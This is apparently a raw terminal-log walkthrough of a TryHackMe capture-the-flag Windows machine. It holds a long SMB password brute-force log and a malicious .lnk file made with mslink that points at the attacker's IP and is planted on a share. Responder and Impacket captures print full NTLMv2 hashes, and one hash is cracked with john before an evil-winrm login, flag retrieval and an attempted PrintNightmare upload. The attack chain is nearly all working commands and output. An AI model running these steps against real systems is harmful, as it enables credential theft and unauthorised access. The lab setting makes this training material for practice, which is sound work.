[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\masonmor:test',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\masonmor:uploader',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\masonmor:password',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\masonmor:admin',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\masonmor:administrator',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\masonmor:marketing',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\masonmor:12345678',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\masonmor:1234',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\masonmor:12345',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\masonmor:qwerty',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\masonmor:webadmin',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\masonmor:webmaster',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\masonmor:maintenance',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\masonmor:techsupport',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\masonmor:letmein',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\masonmor:logon',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\masonmor:Passw@rd',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\masonmor:alpine',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\maxdou:root',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\maxdou:toor',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\maxdou:raspberry',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\maxdou:dietpi',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\maxdou:test',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\maxdou:uploader',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\maxdou:password',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\maxdou:admin',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\maxdou:administrator',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\maxdou:marketing',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\maxdou:12345678',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\maxdou:1234',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\maxdou:12345',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\maxdou:qwerty',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\maxdou:webadmin',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\maxdou:webmaster',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\maxdou:maintenance',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\maxdou:techsupport',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\maxdou:letmein',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\maxdou:logon',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\maxdou:Passw@rd',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\maxdou:alpine',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\meghancha:root',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\meghancha:toor',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\meghancha:raspberry',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\meghancha:dietpi',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\meghancha:test',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\meghancha:uploader',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\meghancha:password',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\meghancha:admin',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\meghancha:administrator',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\meghancha:marketing',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\meghancha:12345678',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\meghancha:1234',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\meghancha:12345',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\meghancha:qwerty',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\meghancha:webadmin',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\meghancha:webmaster',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\meghancha:maintenance',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\meghancha:techsupport',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\meghancha:letmein',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\meghancha:logon',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\meghancha:Passw@rd',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\meghancha:alpine',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\meghanhol:root',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\meghanhol:toor',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\meghanhol:raspberry',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\meghanhol:dietpi',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\meghanhol:test',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\meghanhol:uploader',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\meghanhol:password',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\meghanhol:admin',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\meghanhol:administrator',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\meghanhol:marketing',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\meghanhol:12345678',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\meghanhol:1234',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\meghanhol:12345',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\meghanhol:qwerty',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\meghanhol:webadmin',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\meghanhol:webmaster',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\meghanhol:maintenance',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\meghanhol:techsupport',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\meghanhol:letmein',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\meghanhol:logon',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\meghanhol:Passw@rd',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\meghanhol:alpine',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\michellewat:root',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\michellewat:toor',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\michellewat:raspberry',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\michellewat:dietpi',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\michellewat:test',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\michellewat:uploader',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\michellewat:password',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\michellewat:admin',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\michellewat:administrator',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\michellewat:marketing',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\michellewat:12345678',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\michellewat:1234',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\michellewat:12345',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\michellewat:qwerty',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\michellewat:webadmin',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\michellewat:webmaster',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\michellewat:maintenance',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\michellewat:techsupport',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\michellewat:letmein',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\michellewat:logon',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\michellewat:Passw@rd',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\michellewat:alpine',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\miriamwar:root',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\miriamwar:toor',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\miriamwar:raspberry',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\miriamwar:dietpi',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\miriamwar:test',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\miriamwar:uploader',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\miriamwar:password',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\miriamwar:admin',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\miriamwar:administrator',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\miriamwar:marketing',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\miriamwar:12345678',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\miriamwar:1234',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\miriamwar:12345',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\miriamwar:qwerty',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\miriamwar:webadmin',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\miriamwar:webmaster',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\miriamwar:maintenance',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\miriamwar:techsupport',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\miriamwar:letmein',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\miriamwar:logon',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\miriamwar:Passw@rd',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\miriamwar:alpine',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\myrtleowe:root',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\myrtleowe:toor',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\myrtleowe:raspberry',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\myrtleowe:dietpi',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\myrtleowe:test',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\myrtleowe:uploader',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\myrtleowe:password',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\myrtleowe:admin',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\myrtleowe:administrator',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\myrtleowe:marketing',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\myrtleowe:12345678',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\myrtleowe:1234',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\myrtleowe:12345',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\myrtleowe:qwerty',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\myrtleowe:webadmin',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\myrtleowe:webmaster',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\myrtleowe:maintenance',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\myrtleowe:techsupport',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\myrtleowe:letmein',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\myrtleowe:logon',
[+] 10.10.242.97:445      - 10.10.242.97:445 - Success: '.\myrtleowe:Passw@rd'
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\nataliearm:root',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\nataliearm:toor',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\nataliearm:raspberry',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\nataliearm:dietpi',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\nataliearm:test',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\nataliearm:uploader',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\nataliearm:password',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\nataliearm:admin',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\nataliearm:administrator',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\nataliearm:marketing',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\nataliearm:12345678',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\nataliearm:1234',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\nataliearm:12345',
[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\nataliearm:qwerty',
^C[*] 10.10.242.97:445      - Caught interrupt from the console...
[*] Auxiliary module execution completed


after 25 min

myrtleowe:Passw@rd

┌──(kali㉿kali)-[/usr/share/seclists/Passwords/Common-Credentials]
└─$ smbmap -u myrtleowe -p Passw@rd -H 10.10.242.97
[+] IP: 10.10.242.97:445        Name: set.windcorp.thm                                  
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        ADMIN$                                                  NO ACCESS       Remote Admin
        C$                                                      NO ACCESS       Default share
        E$                                                      NO ACCESS       Default share
        Files                                                   READ ONLY
        IPC$                                                    READ ONLY       Remote IPC

┌──(kali㉿kali)-[~/Set]
└─$ smbclient \\\\10.10.242.97\\Files -U myrtleowe
Password for [WORKGROUP\myrtleowe]: Passw@rd
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Tue Jun 16 17:08:26 2020
  ..                                  D        0  Tue Jun 16 17:08:26 2020
  Info.txt                            A      123  Tue Jun 16 17:57:12 2020

                10328063 blocks of size 4096. 6184765 blocks available
smb: \> get Info.txt 
getting file \Info.txt of size 123 as Info.txt (0.1 KiloBytes/sec) (average 0.1 KiloBytes/sec)
smb: \> exit
                                                                                                              
┌──(kali㉿kali)-[~/Set]
└─$ cat Info.txt       
Zip and save your project files here. 
We will review them

BTW.
Flag1: THM{4c66e2b8d4c45a65e6a7d0c7ad4a5d7ff245dc14}

go to https://www.mamachine.org/mslink/

┌──(kali㉿kali)-[~/Set]
└─$ tar -xzvf mslink_v1.3.tar.gz

Este comando extraerá el contenido del archivo `mslink_v1.3.tar.gz` en el directorio actual. La opción `-x` indica que se debe extraer el archivo, la opción `-z` indica que se debe descomprimir un archivo comprimido con gzip, y la opción `-v` indica que se deben mostrar los mensajes de progreso mientras se extrae el archivo.

mslink_v1.3/
mslink_v1.3/mslink
mslink_v1.3/Makefile
mslink_v1.3/README
mslink_v1.3/mslink.c
                                                                                                              
┌──(kali㉿kali)-[~/Set]
└─$ ls
Info.txt  mslink_v1.3  mslink_v1.3.tar.gz  users_final.txt  users.xml
                                                                                                              
┌──(kali㉿kali)-[~/Set]
└─$ cd mslink_v1.3 
                                                                                                              
┌──(kali㉿kali)-[~/Set/mslink_v1.3]
└─$ ls
Makefile  mslink  mslink.c  README

┌──(kali㉿kali)-[~/Set/mslink_v1.3]
└─$ sudo ./mslink -l lala -n witty -i \\\\10.10.242.97\\share -o witty.lnk
[sudo] password for kali: 
Création d'un raccourci de type "dossier local" avec pour cible lala 
zsh: segmentation fault  sudo ./mslink -l lala -n witty -i \\\\10.10.242.97\\share -o witty.lnk
                                                                                                              
┌──(kali㉿kali)-[~/Set/mslink_v1.3]
└─$ ls
Makefile  mslink  mslink.c  README  witty.lnk

┌──(kali㉿kali)-[~/Set/mslink_v1.3]
└─$ zip hook.zip witty.lnk 
  adding: witty.lnk (stored 0%)

not work download version escrita en bash like this

┌──(kali㉿kali)-[~/Downloads]
└─$ chmod +x mslink_v1.3.sh 
                                                                                                              
┌──(kali㉿kali)-[~/Downloads]
└─$ ./mslink_v1.3.sh -l notimportant -n hook -i \\\\10.8.19.103\\share -o hook.lnk
Création d'un raccourci de type "dossier local" avec pour cible notimportant

                                                                                                              
┌──(kali㉿kali)-[~/Downloads]
└─$ mv hook.lnk ../Set          
                                                                                                              
┌──(kali㉿kali)-[~/Downloads]
└─$ cd ../Set              
                                                                                                              
┌──(kali㉿kali)-[~/Set]
└─$ ls      
hook.lnk  Info.txt  mslink_v1.2  mslink_v1.2.tar.gz  users_final.txt  users.xml
                                                                                                              
┌──(kali㉿kali)-[~/Set]
└─$ rm -r mslink_v1.2       
rm: remove write-protected regular empty file 'mslink_v1.2/witty.lnk'? yes
                                                                                                              
┌──(kali㉿kali)-[~/Set]
└─$ rm -r mslink_v1.2.tar.gz 


┌──(kali㉿kali)-[~/Set]
└─$ ls -lah 
total 36K
drwxr-xr-x   2 kali kali 4.0K Jan  2 12:21 .
drwxr-xr-x 106 kali kali 4.0K Jan  2 12:18 ..
-rw-r--r--   1 kali kali  165 Jan  2 12:19 hook.lnk
-rw-r--r--   1 kali kali  123 Jan  2 11:42 Info.txt
-rw-r--r--   1 kali kali 1.2K Jan  2 10:42 users_final.txt
-rw-r--r--   1 kali kali  13K Jan  2 10:29 users.xml

┌──(kali㉿kali)-[~/Set]
└─$ zip hook.zip hook.lnk 
  adding: hook.lnk (deflated 42%)


┌──(kali㉿kali)-[~/Set]
└─$ smbclient \\\\10.10.242.97\\Files -U myrtleowe
Password for [WORKGROUP\myrtleowe]:
Try "help" to get a list of possible commands.
smb: \> put hook.zip
putting file hook.zip as \hook.zip (0.4 kb/s) (average 0.4 kb/s)
smb: \> ls
  .                                   D        0  Mon Jan  2 12:23:47 2023
  ..                                  D        0  Mon Jan  2 12:23:47 2023
  hook.zip                            A      261  Mon Jan  2 12:23:47 2023
  Info.txt                            A      123  Tue Jun 16 17:57:12 2020

                10328063 blocks of size 4096. 6184274 blocks available

┌──(kali㉿kali)-[~/Set]
└─$ sudo responder -I tun0
[sudo] password for kali: 
                                         __
  .----.-----.-----.-----.-----.-----.--|  |.-----.----.
  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|
  |__| |_____|_____|   __|_____|__|__|_____||_____|__|
                   |__|

           NBT-NS, LLMNR & MDNS Responder 3.1.3.0

  To support this project:
  Patreon -> https://www.patreon.com/PythonResponder
  Paypal  -> https://paypal.me/PythonResponder

  Author: Laurent Gaffie (laurent.gaffie@gmail.com)
  To kill this script hit CTRL-C


[+] Poisoners:
    LLMNR                      [ON]
    NBT-NS                     [ON]
    MDNS                       [ON]
    DNS                        [ON]
    DHCP                       [OFF]

[+] Servers:
    HTTP server                [ON]
    HTTPS server               [ON]
    WPAD proxy                 [OFF]
    Auth proxy                 [OFF]
    SMB server                 [ON]
    Kerberos server            [ON]
    SQL server                 [ON]
    FTP server                 [ON]
    IMAP server                [ON]
    POP3 server                [ON]
    SMTP server                [ON]
    DNS server                 [ON]
    LDAP server                [ON]
    RDP server                 [ON]
    DCE-RPC server             [ON]
    WinRM server               [ON]

[+] HTTP Options:
    Always serving EXE         [OFF]
    Serving EXE                [OFF]
    Serving HTML               [OFF]
    Upstream Proxy             [OFF]

[+] Poisoning Options:
    Analyze Mode               [OFF]
    Force WPAD auth            [OFF]
    Force Basic Auth           [OFF]
    Force LM downgrade         [OFF]
    Force ESS downgrade        [OFF]

[+] Generic Options:
    Responder NIC              [tun0]
    Responder IP               [10.8.19.103]
    Responder IPv6             [fe80::7e18:39ac:d2c6:31b6]
    Challenge set              [random]
    Don't Respond To Names     ['ISATAP']

[+] Current Session Variables:
    Responder Machine Name     [WIN-N9R65QVOOEA]
    Responder Domain Name      [Z4GF.LOCAL]
    Responder DCE-RPC Port     [48636]

[+] Listening for events...                                                                                   

[SMB] NTLMv2-SSP Client   : 10.10.242.97
[SMB] NTLMv2-SSP Username : SET\MichelleWat
[SMB] NTLMv2-SSP Hash     : MichelleWat::SET:58f0e792208dabc9:D563BF18F3FC74B57D34C71C1C493176:0101000000000000808EACFBA41ED9018E8935FEE9DD805100000000020008005A0034004700460001001E00570049004E002D004E003900520036003500510056004F004F004500410004003400570049004E002D004E003900520036003500510056004F004F00450041002E005A003400470046002E004C004F00430041004C00030014005A003400470046002E004C004F00430041004C00050014005A003400470046002E004C004F00430041004C0007000800808EACFBA41ED901060004000200000008003000300000000000000000000000002000005E431CA5EBD98F5126348040BDC5D09560C5EF67524F061E44D359BA4CED24280A001000000000000000000000000000000000000900200063006900660073002F00310030002E0038002E00310039002E003100300033000000000000000000                                               
[*] Skipping previously captured hash for SET\MichelleWat
[*] Skipping previously captured hash for SET\MichelleWat

:) 

let's use smbserver.py too

smb: \> put hook.zip
putting file hook.zip as \hook.zip (0.4 kb/s) (average 0.4 kb/s)

┌──(kali㉿kali)-[~/Set]
└─$ sudo smbserver.py -smb2support share .
Impacket v0.9.24.dev1+20210704.162046.29ad5792 - Copyright 2021 SecureAuth Corporation

[*] Config file parsed
[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
[*] Config file parsed
[*] Config file parsed
[*] Config file parsed
[*] Incoming connection (10.10.242.97,50316)
[*] AUTHENTICATE_MESSAGE (SET\MichelleWat,SET)
[*] User SET\MichelleWat authenticated successfully
[*] MichelleWat::SET:aaaaaaaaaaaaaaaa:a6c7a63c90fbd22819a7a6ece456ed9d:01010000000000000037016dcf1ed90100c26a5aa9dc4eaf00000000010010006d005300560044006c00660042006800030010006d005300560044006c00660042006800020010006600610044006200460077004b007500040010006600610044006200460077004b007500070008000037016dcf1ed901060004000200000008003000300000000000000000000000002000005e431ca5ebd98f5126348040bdc5d09560c5ef67524f061e44d359ba4ced24280a001000000000000000000000000000000000000900200063006900660073002f00310030002e0038002e00310039002e003100300033000000000000000000
[*] Closing down connection (10.10.242.97,50316)
[*] Remaining connections []
[*] Incoming connection (10.10.242.97,50317)
[*] AUTHENTICATE_MESSAGE (SET\MichelleWat,SET)
[*] User SET\MichelleWat authenticated successfully
[*] MichelleWat::SET:aaaaaaaaaaaaaaaa:6994eb7354f2bd3f948ebeeab6c61ca8:01010000000000000037016dcf1ed901ccac7e5feabc2eb100000000010010006d005300560044006c00660042006800030010006d005300560044006c00660042006800020010006600610044006200460077004b007500040010006600610044006200460077004b007500070008000037016dcf1ed901060004000200000008003000300000000000000000000000002000005e431ca5ebd98f5126348040bdc5d09560c5ef67524f061e44d359ba4ced24280a001000000000000000000000000000000000000900200063006900660073002f00310030002e0038002e00310039002e003100300033000000000000000000
[*] Closing down connection (10.10.242.97,50317)
[*] Remaining connections []
[*] Incoming connection (10.10.242.97,50318)
[*] AUTHENTICATE_MESSAGE (SET\MichelleWat,SET)
[*] User SET\MichelleWat authenticated successfully
[*] MichelleWat::SET:aaaaaaaaaaaaaaaa:f3319de1a8c89bc7216bc5183bb9f26a:010100000000000080cd996dcf1ed901d8818a24aad333d300000000010010006d005300560044006c00660042006800030010006d005300560044006c00660042006800020010006600610044006200460077004b007500040010006600610044006200460077004b0075000700080080cd996dcf1ed901060004000200000008003000300000000000000000000000002000005e431ca5ebd98f5126348040bdc5d09560c5ef67524f061e44d359ba4ced24280a001000000000000000000000000000000000000900200063006900660073002f00310030002e0038002e00310039002e003100300033000000000000000000
[*] Closing down connection (10.10.242.97,50318)
[*] Remaining connections []


now using john

┌──(kali㉿kali)-[~/Set]
└─$ nano hash_michelle   
                                                                                                                                                                                                             
┌──(kali㉿kali)-[~/Set]
└─$ john --wordlist=/usr/share/wordlists/rockyou.txt hash_michelle 
Using default input encoding: UTF-8
Loaded 1 password hash (netntlmv2, NTLMv2 C/R [MD4 HMAC-MD5 32/64])
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
!!!MICKEYmouse   (MichelleWat)     
1g 0:00:00:14 DONE (2023-01-02 12:28) 0.06910g/s 991275p/s 991275c/s 991275C/s !)(OPPQR..*7¡Vamos!
Use the "--show --format=netntlmv2" options to display all of the cracked passwords reliably
Session completed.

MichelleWat:!!!MICKEYmouse

┌──(kali㉿kali)-[~/Set]
└─$ evil-winrm -i 10.10.242.97 -u MichelleWat -p '!!!MICKEYmouse' -N

Evil-WinRM shell v3.4

Warning: Remote path completion is disabled

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\MichelleWat\Documents> ls
*Evil-WinRM* PS C:\Users\MichelleWat\Documents> cd ..\Desktop
*Evil-WinRM* PS C:\Users\MichelleWat\Desktop> ls


    Directory: C:\Users\MichelleWat\Desktop


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----        6/16/2020   2:07 PM             52 Flag2.txt


*Evil-WinRM* PS C:\Users\MichelleWat\Desktop> type Flag2.txt
Flag2: THM{690798b1780964f5f51cebd854da5a2ea236ebb5}

┌──(kali㉿kali)-[/tmp/CVE-2021-1675]
└─$ ls
CVE-2021-1675.ps1  nightmare-dll  README.md
                                                                                                              
┌──(kali㉿kali)-[/tmp/CVE-2021-1675]
└─$ cp CVE-2021-1675.ps1 /home/kali/Set  

*Evil-WinRM* PS C:\Users\MichelleWat\Desktop> upload CVE-2021-1675.ps1
Info: Uploading CVE-2021-1675.ps1 to C:\Users\MichelleWat\Desktop\CVE-2021-1675.ps1

Error: [WinRM::FS::Core::FileTransporter] Upload failed (exitcode: 0), but stderr present
Cannot invoke method. Method invocation is supported only on core types in this language mode.                
At line:51 char:12                                                                                            
+     return $ExecutionContext.SessionState.Path.GetUnresolvedProviderP ...                                   
+            ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~                                       
    + CategoryInfo          : InvalidOperation: (:) [], RuntimeException                                      
    + FullyQualifiedErrorId : MethodInvocationNotSupportedInConstrainedLanguage                               
Cannot bind argument to parameter 'Path' because it is null.                                                  
At line:19 char:18                                                                                            
+     if(Test-Path $dst -PathType Container) {                                                                
+                  ~~~~                                                                                       
    + CategoryInfo          : InvalidData: (:) [Test-Path], ParameterBindingValidationException               
    + FullyQualifiedErrorId : ParameterArgumentValidationErrorNullNotAllowed,Microsoft.PowerShell.Commands.TestPathCommand                                                                                                  
Cannot bind argument to parameter 'Path' because it is null.                                                  
At line:24 char:41                                                                                            
+       chk_exists = ($exists = Test-Path $dst -PathType Leaf)                                                
+                                         ~~~~                                                                
    + CategoryInfo          : InvalidData: (:) [Test-Path], ParameterBindingValidationException               
    + FullyQualifiedErrorId : ParameterArgumentValidationErrorNullNotAllowed,Microsoft.PowerShell.Commands.TestPathCommand                                                                                                  
: ["/usr/share/rubygems-integration/all/gems/winrm-fs-1.3.5/lib/winrm-fs/core/file_transporter.rb:408:in `parse_response'", "/usr/share/rubygems-integration/all/gems/winrm-fs-1.3.5/lib/winrm-fs/core/file_transporter.rb:224:in `check_files'", "/usr/share/rubygems-integration/all/gems/winrm-fs-1.3.5/lib/winrm-fs/core/file_transporter.rb:91:in `block in upload'", "/usr/lib/ruby/3.0.0/benchmark.rb:293:in `measure'", "/usr/share/rubygems-integration/all/gems/winrm-fs-1.3.5/lib/winrm-fs/core/file_transporter.rb:89:in `upload'", "/usr/share/rubygems-integration/all/gems/winrm-fs-1.3.5/lib/winrm-fs/file_manager.rb:143:in `block in upload'", "/usr/share/rubygems-integration/all/gems/winrm-2.3.6/lib/winrm/connection.rb:42:in `shell'", "/usr/share/rubygems-integration/all/gems/winrm-fs-1.3.5/lib/winrm-fs/file_manager.rb:140:in `upload'", "/usr/share/rubygems-integration/all/gems/evil-winrm-3.4/bin/evil-winrm:596:in `block in main'", "/usr/share/rubygems-integration/all/gems/winrm-2.3.6/lib/winrm/connection.rb:42:in `shell'", "/usr/share/rubygems-integration/all/gems/evil-winrm-3.4/bin/evil-winrm:521:in `main'", "/usr/share/rubygems-integration/all/gems/evil-winrm-3.4/bin/evil-winrm:974:in `<top (required)>'", "/usr/bin/evil-winrm:25:in `load'", "/usr/bin/evil-winrm:25:in `<main>'"]                             

Error: Upload failed. Check filenames or paths

maybe winpeas

┌──(kali㉿kali)-[~/Set]
└─$ cp /home/kali/Downloads/Enterprise/winPEASany_ofs.exe winPEASany_ofs.exe
                                                                                                              
┌──(kali㉿kali)-[~/Set]
└─$ ls
